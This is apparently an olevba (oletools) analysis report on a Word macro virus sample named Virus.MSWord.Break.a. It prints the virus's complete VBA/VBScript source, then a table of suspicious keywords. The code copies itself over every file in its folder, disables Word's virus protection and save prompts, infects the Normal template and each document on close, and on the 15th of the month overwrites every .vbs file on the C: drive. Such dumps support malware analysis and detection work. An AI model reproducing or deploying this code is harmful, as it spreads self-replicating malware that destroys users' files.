olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Break.a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Break.a 
in file: Virus.MSWord.Break.a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'1nternal
'VBS/DOC
On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("Wscript.Shell")
Parent = Wscript.ScriptFullName
vPath = Left(Parent, InStrRev(Parent, "\"))
For Each Target In FSO.GetFolder(vPath).Files
    FSO.CopyFile Parent, Target.Name, 1
Next
Set WordObj = CreateObject("Word.Application")
Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule
If NT.Lines(1,1) <> "'1nternal" then
	WordObj.Options.SaveNormalPrompt = False
	NT.DeleteLines 1, NT.CountOfLines
	NT.AddfromFile WScript.ScriptFullName
	Call SharedReplace()
	NT.ReplaceLine 30, "	On Error Goto Break"
End If

Private NT

Private Sub SharedReplace()
	For I = 3 to 19
		NT.ReplaceLine I, "'" + NT.Lines(I,1)
	Next
End Sub

Private Sub Document_Close()
	'On Error Goto Break
	Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
	Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule

	Options.VirusProtection = False
        Options.ConfirmConversions = False
        Options.SaveNormalPrompt = False
        If NT.Lines(1, 1) <> "'1nternal" Then
                For i = 1 To 71
                        NT.InsertLines i, AD.Lines(i, 1)
                Next
        End If
        If AD.Lines(1, 1) <> "'1nternal" Then
                For i = 1 To 71
                        AD.InsertLines i, NT.Lines(i, 1)
                Next
        End If
	If Day(Now) = 15 Then
		Set FSO = CreateObject("Scripting.FileSystemObject")
		For I = 3 to 19
			NT.ReplaceLine I, Mid(NT.Lines(I,1),2)
		Next
		Set fs = Application.FileSearch
	                fs.NewSearch
        	        fs.LookIn = "C:\"
	               	fs.SearchSubFolders = True
        	        fs.FileName = "*.vbs"
	                fs.Execute
        	        For i = 1 To fs.FoundFiles.Count
                	        Set f = FSO.OpenTextFile(fs.FoundFiles(i), 2, True)
                        	NT.ReplaceLine 30, "'On ErrLine"
	                        For k = 1 To 71
        	                        f.Write NT.Lines(k, 1) + Chr(13) + Chr(10)
                	        Next
	                    f.Close
        	        Next
		Call SharedReplace		
		NT.ReplaceLine 30, "	 On ErRoR Goto BreAk"
	End If
Break:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

